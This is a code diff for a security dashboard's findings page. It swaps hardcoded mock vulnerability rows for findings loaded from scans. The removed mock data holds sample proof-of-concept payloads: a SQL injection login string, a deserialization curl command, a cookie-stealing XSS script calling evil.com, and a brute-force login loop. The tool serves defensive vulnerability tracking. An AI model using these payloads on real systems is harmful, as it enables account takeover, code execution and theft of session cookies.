@@ -1,153 +1,131 @@
 "use client"
 
-import { useState, Fragment } from "react"
+import Link from "next/link"
+import { useEffect, useMemo, useState } from "react"
+import { AlertTriangle, ExternalLink, Search, ShieldCheck, ShieldOff } from "lucide-react"
+
 import { DashboardSidebar } from "@/components/dashboard/sidebar"
 import { TopBar } from "@/components/dashboard/top-bar"
-import { 
-  Search, 
-  SlidersHorizontal, 
-  ChevronDown,
-  ChevronRight,
-  Download,
-  ExternalLink,
-  AlertTriangle,
-  Shield,
-  Bug,
-  Link as LinkIcon
-} from "lucide-react"
+import { Spinner } from "@/components/ui/spinner"
+import {
+  listScanFindings,
+  listScans,
+  type ApiFinding,
+  type Scan,
+} from "@/lib/scans-store"
 import { cn } from "@/lib/utils"
 
-// Mock data for findings
-const FINDINGS = [
-  {
-    id: "CVE-2024-1234",
-    title: "SQL Injection in User Authentication Endpoint",
-    severity: "critical",
-    cvss: 9.8,
-    target: "api.acmecorp.com/auth/login",
-    status: "open",
-    owasp: "A03:2021",
-    description: "A SQL injection vulnerability exists in the user authentication endpoint that allows attackers to bypass authentication and extract sensitive data from the database.",
-    remediation: "Implement parameterized queries or prepared statements. Validate and sanitize all user inputs before processing.",
-    poc: "POST /auth/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"admin'--\", \"password\": \"x\"}",
-  },
-  {
-    id: "CVE-2024-5678",
-    title: "Remote Code Execution via Deserialization",
-    severity: "critical",
-    cvss: 9.1,
-    target: "api.acmecorp.com/upload",
-    status: "in_progress",
-    owasp: "A08:2021",
-    description: "Insecure deserialization of user-controlled data allows remote code execution on the server. Attackers can execute arbitrary commands with server privileges.",
-    remediation: "Avoid deserializing untrusted data. Implement integrity checks and use type-safe serialization formats.",
-    poc: "curl -X POST -d '{\"__class__\":\"subprocess.Popen\",\"args\":[\"id\"]}' target/upload",
-  },
-  {
-    id: "CVE-2024-9012",
-    title: "Broken Access Control on Admin Panel",
-    severity: "high",
-    cvss: 8.6,
-    target: "admin.acmecorp.com/users",
-    status: "open",
-    owasp: "A01:2021",
-    description: "Insufficient access control allows authenticated users to access administrative functions and view/modify other users' data.",
-    remediation: "Implement proper role-based access control (RBAC) and verify permissions on every request.",
-    poc: "GET /admin/users HTTP/1.1\nCookie: session=user_token\n\n# Returns all user data including admin accounts",
-  },
-  {
-    id: "CVE-2024-3456",
-    title: "Cross-Site Scripting (XSS) in Comments",
-    severity: "medium",
-    cvss: 6.1,
-    target: "acmecorp.com/posts/*/comments",
-    status: "open",
-    owasp: "A03:2021",
-    description: "Stored XSS vulnerability in the comments section allows attackers to inject malicious scripts that execute in victims' browsers.",
-    remediation: "Implement proper output encoding and Content Security Policy (CSP) headers.",
-    poc: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
-  },
-  {
-    id: "CVE-2024-7890",
-    title: "Sensitive Data Exposure in API Response",
-    severity: "medium",
-    cvss: 5.3,
-    target: "api.acmecorp.com/users/profile",
-    status: "resolved",
-    owasp: "A02:2021",
-    description: "API endpoint returns excessive data including password hashes and internal IDs in the response body.",
-    remediation: "Implement proper data filtering and return only necessary fields. Use DTOs for API responses.",
-    poc: "GET /users/profile returns: {\"id\":1,\"email\":\"user@test.com\",\"password_hash\":\"$2b$...\"}",
-  },
-  {
-    id: "CVE-2024-2345",
-    title: "Missing Rate Limiting on Login",
-    severity: "low",
-    cvss: 3.7,
-    target: "api.acmecorp.com/auth/login",
-    status: "open",
-    owasp: "A07:2021",
-    description: "No rate limiting on authentication endpoint allows brute force attacks against user accounts.",
-    remediation: "Implement rate limiting, account lockout policies, and consider adding CAPTCHA after failed attempts.",
-    poc: "for i in {1..1000}; do curl -X POST -d '{\"user\":\"admin\",\"pass\":\"$i\"}' target/login; done",
-  },
-]
-
-const severityConfig = {
-  critical: {
-    label: "Critical",
-    bgClass: "bg-critical/10",
-    textClass: "text-critical",
-    dotClass: "bg-critical animate-pulse",
-  },
-  high: {
-    label: "High",
-    bgClass: "bg-high/10",
-    textClass: "text-high",
-    dotClass: "bg-high",
-  },
-  medium: {
-    label: "Medium",
-    bgClass: "bg-medium/10",
-    textClass: "text-medium",
-    dotClass: "bg-medium",
-  },
-  low: {
-    label: "Low",
-    bgClass: "bg-low/10",
-    textClass: "text-low",
-    dotClass: "bg-low",
-  },
+type FindingIndexItem = ApiFinding & {
+  scan: Scan
 }
 
-const statusConfig = {
-  open: { label: "Open", class: "bg-critical/10 text-critical" },
-  in_progress: { label: "In Progress", class: "bg-primary/10 text-primary" },
-  resolved: { label: "Resolved", class: "bg-low/10 text-low" },
+const severityStyles = {
+  critical: "bg-critical/10 text-critical",
+  high: "bg-high/10 text-high",
+  medium: "bg-medium/10 text-medium",
+  low: "bg-low/10 text-low",
+  info: "bg-muted/10 text-muted-foreground",
+}
+
+const provenanceStyles = {
+  live: "bg-low/10 text-low",
+  inferred: "bg-primary/10 text-primary",
+  blocked: "bg-critical/10 text-critical",
+  simulated: "bg-amber-500/10 text-amber-400",
 }
 
 export default function FindingsPage() {
+  const [items, setItems] = useState<FindingIndexItem[]>([])
   const [searchQuery, setSearchQuery] = useState("")
-  const [expandedRow, setExpandedRow] = useState<string | null>(null)
   const [severityFilter, setSeverityFilter] = useState<string>("all")
-  const [statusFilter, setStatusFilter] = useState<string>("all")
+  const [verificationFilter, setVerificationFilter] = useState<string>("all")
+  const [provenanceFilter, setProvenanceFilter] = useState<string>("all")
+  const [isLoading, setIsLoading] = useState(true)
+  const [error, setError] = useState<string | null>(null)
 
-  const filteredFindings = FINDINGS.filter((finding) => {
-    const matchesSearch =
-      finding.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      finding.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      finding.target.toLowerCase().includes(searchQuery.toLowerCase())
-    const matchesSeverity = severityFilter === "all" || finding.severity === severityFilter
-    const matchesStatus = statusFilter === "all" || finding.status === statusFilter
-    return matchesSearch && matchesSeverity && matchesStatus
-  })
+  useEffect(() => {
+    let cancelled = false
 
-  const severityCounts = {
-    critical: FINDINGS.filter((f) => f.severity === "critical").length,
-    high: FINDINGS.filter((f) => f.severity === "high").length,
-    medium: FINDINGS.filter((f) => f.severity === "medium").length,
-    low: FINDINGS.filter((f) => f.severity === "low").length,
-  }
+    async function load() {
+      setIsLoading(true)
+      setError(null)
+      try {
+        const scanResponse = await listScans({ pageSize: 100 })
+        const scansWithFindings = scanResponse.items.filter((scan) => {
+          const count =
+            scan.findings.critical + scan.findings.high + scan.findings.medium + scan.findings.low
+          return count > 0
+        })
+
+        const findingGroups = await Promise.all(
+          scansWithFindings.map(async (scan) => {
+            const findings = await listScanFindings(scan.id, 100)
+            return findings.map((finding) => ({ ...finding, scan }))
+          })
+        )
+
+        if (!cancelled) {
+          setItems(
+            findingGroups
+              .flat()
+              .sort(
+                (left, right) =>
+                  new Date(right.created_at).getTime() - new Date(left.created_at).getTime()
+              )
+          )
+        }
+      } catch (err) {
+        if (!cancelled) {
+          setError(err instanceof Error ? err.message : "Failed to load persisted findings.")
+        }
+      } finally {
+        if (!cancelled) {
+          setIsLoading(false)
+        }
+      }
+    }
+
+    void load()
+
+    return () => {
+      cancelled = true
+    }
+  }, [])
+
+  const filteredItems = useMemo(() => {
+    return items.filter((item) => {
+      const haystack = [
+        item.title,
+        item.scan.target,
+        item.scan.assetName,
+        item.vulnerability_type ?? "",
+        item.tool_source,
+      ]
+        .join(" ")
+        .toLowerCase()
+
+      const matchesSearch = haystack.includes(searchQuery.toLowerCase())
+      const matchesSeverity = severityFilter === "all" || item.severity === severityFilter
+      const matchesVerification =
+        verificationFilter === "all" || (item.verification_state ?? "detected") === verificationFilter
+      const matchesProvenance =
+        provenanceFilter === "all" || (item.execution_provenance ?? "inferred") === provenanceFilter
+
+      return matchesSearch && matchesSeverity && matchesVerification && matchesProvenance
+    })
+  }, [items, provenanceFilter, searchQuery, severityFilter, verificationFilter])
+
+  const severityCounts = useMemo(
+    () =>
+      items.reduce(
+        (acc, item) => {
+          acc[item.severity] += 1
+          return acc
+        },
+        { critical: 0, high: 0, medium: 0, low: 0, info: 0 }
+      ),
+    [items]
+  )
 
   return (
     <div className="min-h-screen bg-background">
@@ -157,232 +135,202 @@ export default function FindingsPage() {
         <TopBar title="Findings" />
 
         <main className="p-6">
-          {/* Header */}
-          <div className="mb-6 flex items-center justify-between">
+          <div className="mb-6 flex items-start justify-between gap-4">
             <div>
-              <h1 className="text-2xl font-semibold text-foreground">Security Findings</h1>
+              <h1 className="text-2xl font-semibold text-foreground">Persisted Findings</h1>
               <p className="mt-1 text-sm text-muted-foreground">
-                Vulnerabilities discovered across your attack surface
+                Real findings aggregated from scan detail data. No hardcoded vulnerability rows remain here.
               </p>
             </div>
-            <button className="flex items-center gap-2 rounded-md border border-border px-4 py-2.5 text-sm font-medium text-muted-foreground transition-all hover:bg-elevated hover:text-foreground">
-              <Download className="h-4 w-4" />
-              Export
-            </button>
+            <Link
+              href="/reports"
+              className="inline-flex items-center gap-2 rounded-md border border-border px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-elevated"
+            >
+              <ShieldCheck className="h-4 w-4" />
+              Open Reports
+            </Link>
           </div>
 
-          {/* Severity Summary */}
-          <div className="mb-6 flex items-center gap-3">
-            {Object.entries(severityCounts).map(([severity, count]) => {
-              const config = severityConfig[severity as keyof typeof severityConfig]
-              return (
-                <button
-                  key={severity}
-                  onClick={() => setSeverityFilter(severityFilter === severity ? "all" : severity)}
-                  className={cn(
-                    "flex items-center gap-2 rounded-lg border px-4 py-2.5 transition-all",
-                    severityFilter === severity
-                      ? "border-primary bg-primary/10"
-                      : "border-border hover:border-muted-foreground"
-                  )}
-                >
-                  <span className={cn("h-2.5 w-2.5 rounded-full", config.dotClass)} />
-                  <span className="text-sm font-medium text-foreground">{count}</span>
-                  <span className="text-sm text-muted-foreground">{config.label}</span>
-                </button>
-              )
-            })}
+          <div className="mb-6 grid grid-cols-2 gap-3 md:grid-cols-5">
+            {(["critical", "high", "medium", "low", "info"] as const).map((severity) => (
+              <div key={severity} className="rounded-lg border border-border bg-card p-4">
+                <p className={cn("text-xs font-medium uppercase tracking-wide", severityStyles[severity])}>
+                  {severity}
+                </p>
+                <p className="mt-2 text-2xl font-semibold text-foreground">{severityCounts[severity]}</p>
+              </div>
+            ))}
           </div>
 
-          {/* Filter/Action Bar */}
-          <div className="mb-6 flex items-center gap-3">
-            <div className="relative flex-1 max-w-md">
+          <div className="mb-6 flex flex-wrap items-center gap-3">
+            <div className="relative min-w-[280px] flex-1">
               <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
               <input
                 type="text"
-                placeholder="Search by CVE, title, or target..."
+                placeholder="Search findings, targets, tools, or vulnerability types..."
                 value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                className="h-10 w-full rounded-md border border-border bg-card pl-10 pr-4 text-sm text-foreground placeholder:text-muted-foreground focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20 transition-all"
+                onChange={(event) => setSearchQuery(event.target.value)}
+                className="h-10 w-full rounded-md border border-border bg-card pl-10 pr-4 text-sm text-foreground placeholder:text-muted-foreground transition-all focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20"
               />
             </div>
-            
+
             <select
-              value={statusFilter}
-              onChange={(e) => setStatusFilter(e.target.value)}
-              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20"
+              value={severityFilter}
+              onChange={(event) => setSeverityFilter(event.target.value)}
+              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground"
             >
-              <option value="all">All Status</option>
-              <option value="open">Open</option>
-              <option value="in_progress">In Progress</option>
-              <option value="resolved">Resolved</option>
+              <option value="all">All severities</option>
+              <option value="critical">Critical</option>
+              <option value="high">High</option>
+              <option value="medium">Medium</option>
+              <option value="low">Low</option>
+              <option value="info">Info</option>
             </select>
 
             <select
-              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20"
+              value={verificationFilter}
+              onChange={(event) => setVerificationFilter(event.target.value)}
+              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground"
             >
-              <option value="all">All OWASP</option>
-              <option value="A01:2021">A01:2021 - Broken Access Control</option>
-              <option value="A02:2021">A02:2021 - Cryptographic Failures</option>
-              <option value="A03:2021">A03:2021 - Injection</option>
+              <option value="all">All proof states</option>
+              <option value="verified">Verified</option>
+              <option value="suspected">Suspected</option>
+              <option value="detected">Detected</option>
+            </select>
+
+            <select
+              value={provenanceFilter}
+              onChange={(event) => setProvenanceFilter(event.target.value)}
+              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground"
+            >
+              <option value="all">All provenance</option>
+              <option value="live">Live</option>
+              <option value="inferred">Inferred</option>
+              <option value="blocked">Blocked</option>
+              <option value="simulated">Simulated</option>
             </select>
           </div>
 
-          {/* Findings Table */}
-          <div className="rounded-lg border border-border bg-card overflow-hidden">
-            <table className="w-full">
-              <thead>
-                <tr className="border-b border-border bg-elevated/50">
-                  <th className="w-8 px-4 py-3"></th>
-                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
-                    ID / Title
-                  </th>
-                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
-                    Severity
-                  </th>
-                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
-                    CVSS
-                  </th>
-                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
-                    Target
-                  </th>
-                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
-                    Status
-                  </th>
-                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
-                    OWASP
-                  </th>
-                </tr>
-              </thead>
-              <tbody className="divide-y divide-border">
-                {filteredFindings.map((finding) => {
-                  const severity = severityConfig[finding.severity as keyof typeof severityConfig]
-                  const status = statusConfig[finding.status as keyof typeof statusConfig]
-                  const isExpanded = expandedRow === finding.id
-
-                  return (
-                    <Fragment key={finding.id}>
-                      <tr
-                        onClick={() => setExpandedRow(isExpanded ? null : finding.id)}
-                        className="group cursor-pointer transition-colors hover:bg-elevated/50"
-                      >
-                        <td className="px-4 py-4">
-                          <ChevronRight
-                            className={cn(
-                              "h-4 w-4 text-muted-foreground transition-transform",
-                              isExpanded && "rotate-90"
-                            )}
-                          />
-                        </td>
-                        <td className="px-4 py-4">
+          <div className="overflow-hidden rounded-lg border border-border bg-card">
+            {isLoading ? (
+              <div className="flex items-center justify-center gap-3 p-10 text-sm text-muted-foreground">
+                <Spinner className="h-5 w-5" />
+                Loading persisted findings from real scans...
+              </div>
+            ) : error ? (
+              <div className="p-6 text-sm text-critical">{error}</div>
+            ) : filteredItems.length === 0 ? (
+              <div className="p-10 text-center text-sm text-muted-foreground">
+                No persisted findings match the current filters.
+              </div>
+            ) : (
+              <table className="w-full">
+                <thead>
+                  <tr className="border-b border-border bg-elevated/50">
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Finding
+                    </th>
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Asset / Target
+                    </th>
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Severity
+                    </th>
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Proof
+                    </th>
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Provenance
+                    </th>
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Source
+                    </th>
+                    <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
+                      Scan
+                    </th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-border">
+                  {filteredItems.map((item) => (
+                    <tr key={item.id} className="align-top transition-colors hover:bg-elevated/40">
+                      <td className="px-4 py-4">
+                        <div className="max-w-[360px]">
+                          <p className="text-sm font-medium text-foreground">{item.title}</p>
+                          <p className="mt-1 text-xs text-muted-foreground">
+                            {item.vulnerability_type ?? "unclassified"} · confidence {item.confidence}%
+                          </p>
+                          {item.description ? (
+                            <p className="mt-2 line-clamp-2 text-xs text-muted-foreground">
+                              {item.description}
+                            </p>
+                          ) : null}
+                        </div>
+                      </td>
+                      <td className="px-4 py-4">
+                        <p className="text-sm font-medium text-foreground">{item.scan.assetName}</p>
+                        <p className="mt-1 font-mono text-xs text-muted-foreground">{item.scan.target}</p>
+                      </td>
+                      <td className="px-4 py-4">
+                        <span className={cn("rounded-md px-2 py-1 text-xs font-medium", severityStyles[item.severity])}>
+                          {item.severity}
+                        </span>
+                      </td>
+                      <td className="px-4 py-4">
+                        <div className="flex items-center gap-2">
+                          {(item.verification_state ?? "detected") === "verified" ? (
+                            <ShieldCheck className="h-4 w-4 text-low" />
+                          ) : (
+                            <ShieldOff className="h-4 w-4 text-muted-foreground" />
+                          )}
                           <div>
-                            <span className="font-medium text-foreground group-hover:text-primary transition-colors">
-                              {finding.title}
-                            </span>
-                            <p className="mt-0.5 font-mono text-xs text-muted-foreground">
-                              {finding.id}
+                            <p className="text-sm capitalize text-foreground">
+                              {item.verification_state ?? "detected"}
+                            </p>
+                            <p className="text-xs text-muted-foreground">
+                              {item.verification_confidence ?? item.confidence}% confidence
                             </p>
                           </div>
-                        </td>
-                        <td className="px-4 py-4">
-                          <span className={cn(
-                            "inline-flex items-center gap-1.5 rounded-md px-2.5 py-1 text-xs font-medium",
-                            severity.bgClass,
-                            severity.textClass
-                          )}>
-                            <span className={cn("h-1.5 w-1.5 rounded-full", severity.dotClass)} />
-                            {severity.label}
-                          </span>
-                        </td>
-                        <td className="px-4 py-4">
-                          <span className={cn(
-                            "font-mono text-sm font-semibold",
-                            finding.cvss >= 9 ? "text-critical" :
-                            finding.cvss >= 7 ? "text-high" :
-                            finding.cvss >= 4 ? "text-medium" : "text-low"
-                          )}>
-                            {finding.cvss.toFixed(1)}
-                          </span>
-                        </td>
-                        <td className="px-4 py-4">
-                          <span className="font-mono text-xs text-muted-foreground">
-                            {finding.target}
-                          </span>
-                        </td>
-                        <td className="px-4 py-4">
-                          <span className={cn(
-                            "rounded-md px-2.5 py-1 text-xs font-medium",
-                            status.class
-                          )}>
-                            {status.label}
-                          </span>
-                        </td>
-                        <td className="px-4 py-4">
-                          <span className="rounded-md border border-border bg-elevated px-2 py-0.5 text-xs font-mono text-muted-foreground">
-                            {finding.owasp}
-                          </span>
-                        </td>
-                      </tr>
-                      
-                      {/* Expanded Row */}
-                      {isExpanded && (
-                        <tr>
-                          <td colSpan={7} className="bg-background p-0">
-                            <div className="border-l-2 border-primary ml-6 p-6">
-                              <div className="grid grid-cols-1 gap-6 lg:grid-cols-3">
-                                {/* Description */}
-                                <div className="lg:col-span-2">
-                                  <div className="mb-4">
-                                    <h4 className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
-                                      <AlertTriangle className="h-4 w-4 text-critical" />
-                                      Description
-                                    </h4>
-                                    <p className="text-sm text-muted-foreground leading-relaxed">
-                                      {finding.description}
-                                    </p>
-                                  </div>
-                                  
-                                  <div className="mb-4">
-                                    <h4 className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
-                                      <Shield className="h-4 w-4 text-low" />
-                                      Remediation
-                                    </h4>
-                                    <p className="text-sm text-muted-foreground leading-relaxed">
-                                      {finding.remediation}
-                                    </p>
-                                  </div>
-                                </div>
+                        </div>
+                      </td>
+                      <td className="px-4 py-4">
+                        <span
+                          className={cn(
+                            "rounded-md px-2 py-1 text-xs font-medium",
+                            provenanceStyles[item.execution_provenance ?? "inferred"]
+                          )}
+                        >
+                          {item.execution_provenance ?? "inferred"}
+                        </span>
+                        {item.execution_reason ? (
+                          <p className="mt-1 max-w-[180px] text-xs text-muted-foreground">
+                            {item.execution_reason}
+                          </p>
+                        ) : null}
+                      </td>
+                      <td className="px-4 py-4">
+                        <div className="text-sm text-foreground">{item.tool_source}</div>
+                        <div className="mt-1 text-xs text-muted-foreground">{item.source_type}</div>
+                      </td>
+                      <td className="px-4 py-4">
+                        <Link
+                          href={`/scans/${item.scan.id}?tab=findings`}
+                          className="inline-flex items-center gap-2 text-sm font-medium text-primary transition-colors hover:text-primary/80"
+                        >
+                          Open
+                          <ExternalLink className="h-3.5 w-3.5" />
+                        </Link>
+                        <p className="mt-1 text-xs text-muted-foreground">{item.scan.statusLabel}</p>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            )}
+          </div>
 
-                                {/* PoC */}
-                                <div>
-                                  <h4 className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
-                                    <Bug className="h-4 w-4 text-high" />
-                                    Proof of Concept
-                                  </h4>
-                                  <pre className="rounded-md bg-elevated p-3 text-xs text-muted-foreground overflow-x-auto font-mono">
-                                    {finding.poc}
-                                  </pre>
-                                  <div className="mt-3 flex gap-2">
-                                    <button className="flex items-center gap-1.5 rounded-md bg-primary/10 px-3 py-1.5 text-xs font-medium text-primary hover:bg-primary/20 transition-colors">
-                                      <ExternalLink className="h-3 w-3" />
-                                      View Full Report
-                                    </button>
-                                    <button className="flex items-center gap-1.5 rounded-md border border-border px-3 py-1.5 text-xs font-medium text-muted-foreground hover:bg-elevated transition-colors">
-                                      <LinkIcon className="h-3 w-3" />
-                                      Copy Link
-                                    </button>
-                                  </div>
-                                </div>
-                              </div>
-                            </div>
-                          </td>
-                        </tr>
-                      )}
-                    </Fragment>
-                  )
-                })}
-              </tbody>
-            </table>
+          <div className="mt-4 flex items-center gap-2 text-xs text-muted-foreground">
+            <AlertTriangle className="h-3.5 w-3.5" />
+            This index is loaded from persisted scan findings. If a scan has not produced findings yet, it will not appear here.
           </div>
         </main>
       </div>
